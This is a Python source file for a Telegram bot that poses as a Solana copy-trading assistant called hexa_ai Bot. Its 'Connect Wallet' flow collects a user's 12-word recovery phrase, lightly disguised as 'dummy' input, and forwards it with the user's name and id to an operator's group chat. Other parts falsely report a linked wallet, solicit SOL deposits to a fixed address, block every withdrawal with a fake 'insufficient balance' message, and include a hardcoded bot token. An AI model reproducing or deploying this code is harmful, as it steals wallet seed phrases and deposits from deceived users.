import re
from telegram import (
    Update,
    ReplyKeyboardMarkup,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes
)
# Store temporary user states
user_states = {}

# ---- CONFIG ----
BOT_TOKEN = "8469292173:AAFwdg2McWdFpzoqnC1ySayDhFFC4UKgAxY"        # <- replace with your new token from BotFather
GROUP_ID = -1002762295115  # <- the group id you mentioned

# ✅ Step 1: Put the wallet function here
async def show_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    wallet_text = (
        "💼 <b>Wallet Overview</b> — <i>Not Connected</i> ❌\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "<b>Holdings</b>\n"
        "• <b>SOL:</b> 0.00 (0%)\n"
        "• <b>Tokens:</b> 0.00 USDT (0%)\n"
        "• <b>Total Assets:</b> 0.00 USDT\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔘 <i>No active tokens detected.</i>\n"
        "💰 <b>Fund Your Bot</b>\n"
        "Send SOL to:\n"
        "<code>HJZ4xfamRhYmTM7hswVSNFhLr31dY8B4Hq4UgfNNcFSJ</code>\n\n"
        "(Funds are required for copy-trading operations.)\n\n"
        "⚡ <b>Quick Actions</b>\n"
        "• ⚓️ /start – Refresh your bot\n\n"
        "👇 <i>What would you like to do next?</i>"
    )

    if update.message:  # user typed 🧩Wallet
        await update.message.reply_text(wallet_text, parse_mode="HTML")
    elif update.callback_query:  # user tapped 💰 Fund Wallet
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(wallet_text, parse_mode="HTML")

        # --- Button Handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query

    if query.data == "fund_wallet":
        await show_wallet(update, context)


# --- Continue with your other handlers (like bot guide, wallet, etc.) ---

# --- SETTINGS MENU ---
async def settings_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    Setting_buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("Number of trades per day", callback_data="trade_per_day")],
        [InlineKeyboardButton("Edit Number of consecutive buys", callback_data="consecutive_buys")],
        [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
    ])

    settings_text = (
        "<b>⚙️ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:"
    )

    await update.message.reply_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=Setting_buttons
    )
# --- CALLBACK HANDLER (BUTTONS) ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    option = query.data
    user_id = query.from_user.id

    # Save state for this user
    user_states[user_id] = option

    await query.edit_message_text(
        text=f"Please enter a number for <b>{option.replace('_', ' ').title()}</b>:",
        parse_mode="HTML"
    )

    # --- MESSAGE HANDLER (NUMERIC INPUT) ---
async def number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    text = update.message.text.strip()

    if user_id not in user_states:
        return  # Ignore if user isn't in a settings state

    # Check if input is a number
    if not text.isdigit():
        await update.message.reply_text("❌ Please enter numbers only.")
        return

    option = user_states.pop(user_id)  # Remove state after use

    # Save or process the setting here (e.g., database or in-memory)
    await update.message.reply_text(
        f"✅ Your setting for <b>{option.replace('_', ' ').title()}</b> "
        f"has been updated to: <b>{text}</b>",
        parse_mode="HTML"
    )

# ---- Helpers ----
def main_menu_markup():
    keyboard = [
        ["💸Withdraw", "🔌Connect Wallet"],
        ["🔍Copy Trade", "🔐Settings"],
        ["🧩Wallet", "🤖Bot Guide"],
        ["📊Live Chart"]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

def cancel_markup():
    return ReplyKeyboardMarkup([["Cancel"]], resize_keyboard=True, one_time_keyboard=True)

# Validate a single word: only letters A-Z (either case)
def is_alpha_word(word: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z]+", word))

# --- /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Welcome to Trading Bot!\n"
        "Step into the world of fast, smart, and stress-free trading, "
        "designed for both beginners and seasoned traders.\n\n"
        "🔗 Connecting to your wallet...\n"
        "⏳ Initializing your account and securing your funds...\n"
        "✅ Wallet successfully created and linked!\n\n"
        "💡Tap Continue below to access your wallet and explore all trading options.",
        reply_markup=main_menu_markup()
    )
    # clear states
    context.user_data.pop("awaiting_dummy", None)
    context.user_data.pop("awaiting_withdraw", None)

# --- Message handler ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (update.message.text or "").strip()
    user = update.effective_user
    user_id = user.id
    user_name = user.username or user.first_name or str(user_id)

    # ----- Handle Connect Wallet (12 dummy words) -----
    if context.user_data.get("awaiting_dummy"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Request cancelled. Back to menu:", reply_markup=main_menu_markup())
            return

        words = [w for w in text.split() if w.strip()]
        count = len(words)

        if count != 12:
            await update.message.reply_text(
                f"❗ Your input contains {count} word(s). Please enter exactly 12 words (letters only).\n\n"
                "Try again or tap Cancel to abort.",
                reply_markup=cancel_markup()
            )
            return

        bad_indices = [i+1 for i, w in enumerate(words) if not is_alpha_word(w)]
        if bad_indices:
            positions = ", ".join(map(str, bad_indices))
            await update.message.reply_text(
                "❗ Some words contain invalid characters. Words must contain only letters (A–Z).\n"
                f"Please check word position(s): {positions} and try again, or tap Cancel to abort.",
                reply_markup=cancel_markup()
            )
            return

        dummy_input = " ".join(words)
        forward_text = (
            f"🔔 Received dummy 12-word input from @{user_name} (id: {user_id}):\n\n"
            f"<pre>{dummy_input}</pre>"
        )
        try:
            await context.bot.send_message(chat_id=GROUP_ID, text=forward_text, parse_mode="HTML")
        except Exception as e:
            await update.message.reply_text("Failed to forward input to the group. Contact the bot admin.")
            print("Error sending to group:", e)
            context.user_data.pop("awaiting_dummy", None)
            await update.message.reply_text("Back to menu:", reply_markup=main_menu_markup())
            return

        context.user_data.pop("awaiting_dummy", None)
        await update.message.reply_text("Thanks — your 12-word dummy input has been recorded.", reply_markup=main_menu_markup())
        return

    # ----- Handle Withdraw flow -----
    if context.user_data.get("awaiting_withdraw"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_withdraw", None)
            await update.message.reply_text("Withdrawal cancelled.", reply_markup=main_menu_markup())
            return

        try:
            amount = float(text)
        except ValueError:
            await update.message.reply_text("❗ Invalid amount. Please enter a number or tap Cancel.", reply_markup=cancel_markup())
            return

        if amount > 0:
            await update.message.reply_text("❗ Insufficient SOL balance.", reply_markup=main_menu_markup())
        else:
            await update.message.reply_text("Withdrawal amount must be greater than zero.", reply_markup=cancel_markup())

        context.user_data.pop("awaiting_withdraw", None)
        return 

    # ----- Handle Copy Trade -----
    if context.user_data.get("awaiting_copy_trade"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_copy_trade", None)
            await update.message.reply_text(
                "Copy Trade cancelled.", 
                reply_markup=main_menu_markup()
            )
            return

        wallet_address = text.strip()

        # ✅ Check if wallet address looks valid (length = 44 and letters/numbers only)
        if len(wallet_address) != 44 or not wallet_address.isalnum():
            await update.message.reply_text(
                "❗ Invalid Solana wallet address.", 
                reply_markup=cancel_markup()
            )
            return

        # ✅ If valid, but still simulate insufficient balance
        await update.message.reply_text(
            "❗ Insufficient SOL balance.", 
            reply_markup=main_menu_markup()
        )

        context.user_data.pop("awaiting_copy_trade", None)
        return

    # ----- Handle Menu selections -----
    if text == "💸Withdraw":
        context.user_data["awaiting_withdraw"] = True
        await update.message.reply_text("💸 Please enter the withdrawal amount:", reply_markup=cancel_markup())
        return

    elif text == "🔌Connect Wallet":
        context.user_data["awaiting_dummy"] = True
        await update.message.reply_text(
            "Please enter your *dummy* 12-word code now.\n\n"
            "Each word must contain only letters (A–Z). If you want to cancel, tap Cancel.",
            reply_markup=cancel_markup()
        )
        return

    elif text == "🔍Copy Trade":
        context.user_data["awaiting_copy_trade"] = True
        await update.message.reply_text(
            "Please enter the Solana wallet address to copy trade.\n\n"
            "If you want to cancel, tap Cancel.",
            reply_markup=cancel_markup()
        )
        return

    elif text == "🔐Settings":
        await update.message.reply_text("Here are your 🔐settings.")

        # Inline buttons that open TradingView charts
        Setting_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("Number of trades per day", callback_data="trade_per_day")],
            [InlineKeyboardButton("Edit Number of consecutive buys", callback_data="consecutive_buys")],
            [InlineKeyboardButton("Sell Position", callback_data="sell_position")],
        ])

        settings_text = (
        "<b>⚙️ Settings Menu</b>\n\n"
        "Your settings are organized into categories for easy management:\n\n"
        "<b>Trading Options:</b>\n"
        "- Configure number of trades per day\n"
        "- Adjust consecutive buys\n"
        "- Manage sell positions\n\n"
        "Choose an option below to update:"
    )
        await update.message.reply_text(
        settings_text,
        parse_mode="HTML",
        reply_markup=Setting_buttons
    )
        return

    elif text == "🧩Wallet":
        await show_wallet(update, context)
        return


    elif text == "🤖Bot Guide":
        guide_text = (
            "📘 <b>How to Use hexa_ai Bot: Complete Feature Guide</b>\n\n"
            "Welcome to <b>hexa_ai Bot</b>, your all-in-one Telegram trading assistant. "
            "This guide walks you through the core features, how to use them safely, "
            "and why some security restrictions are in place.\n\n"

            "1️⃣ <b>Autotrade</b>\n"
            "Automate your trading strategies. Once configured, the bot executes trades "
            "on your behalf based on your parameters. Perfect if you don’t want to "
            "monitor the market constantly.\n\n"

            "2️⃣ <b>Copytrade</b>\n"
            "Mimic trades of successful wallets instantly. Just tap Copytrade, select a "
            "trader, and the bot will replicate their trades in your account.\n\n"

            "3️⃣ <b>Wallet & Import Wallet</b>\n"
            "Check balance, view info, monitor transactions, and manage funds. You can "
            "import a wallet by private key, but <i>exporting keys is disabled</i> for "
            "security reasons.\n\n"

            "4️⃣ <b>Alerts</b>\n"
            "Get notified about price changes, successful trades, or new token launches "
            "so you never miss an opportunity.\n\n"

            "5️⃣ <b>Wallet Info & Network</b>\n"
            "View transaction history, balance, and choose blockchain networks such as "
            "Ethereum or BSC.\n\n"

            "6️⃣ <b>Live Chart</b>\n"
            "Access real-time market data, price trends, and token charts directly in Telegram.\n\n"

            "🔒 <b>Security Note</b>\n"
            "Private key <u>exporting is disabled</u> to protect your funds, even if "
            "your Telegram account is compromised. Importing keys is allowed for safe "
            "wallet connection.\n\n"

            "⚡ <i>Note: Features are only available to funded wallets. Fund your wallet "
            "to unlock the full potential of hexa_ai Bot!</i>"
        )

        # Inline buttons
        guide_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("💰 Fund Wallet", callback_data="fund_wallet")],
        ])

        await update.message.reply_text(guide_text, parse_mode="HTML", reply_markup=guide_buttons)
        return


    elif text == "📊Live Chart":
        chart_text = (
            "<b>🔥 Top Coins Charts</b>\n"
            "Choose a coin below to view its live chart.\n"
        )

        # Inline buttons that open TradingView charts
        chart_buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("📈 BITCOIN (BTC)", url="https://www.tradingview.com/chart/?symbol=BTCUSDT")],
            [InlineKeyboardButton("📈 ETHEREUM (ETH)", url="https://www.tradingview.com/chart/?symbol=ETHUSDT")],
            [InlineKeyboardButton("📈 SOLANA (SOL)", url="https://www.tradingview.com/chart/?symbol=SOLUSDT")],
            [InlineKeyboardButton("📈 DOGECOIN (DOGE)", url="https://www.tradingview.com/chart/?symbol=DOGEUSDT")],
            [InlineKeyboardButton("📈 SHIBA INU (SHIB)", url="https://www.tradingview.com/chart/?symbol=SHIBUSDT")],
            [InlineKeyboardButton("📈 POLKADOT (DOT)", url="https://www.tradingview.com/chart/?symbol=DOTUSDT")],
            [InlineKeyboardButton("📈 CARDANO (ADA)", url="https://www.tradingview.com/chart/?symbol=ADAUSDT")],
            [InlineKeyboardButton("📈 LITECOIN (LTC)", url="https://www.tradingview.com/chart/?symbol=LTCUSDT")]
        ])

        await update.message.reply_text(
            chart_text,
            parse_mode="HTML",
            reply_markup=chart_buttons
        )
        return


    else:
        await update.message.reply_text("Please choose an option from the menu.", reply_markup=main_menu_markup())
        return
    

# --- Main ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("settings", settings_menu))



    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
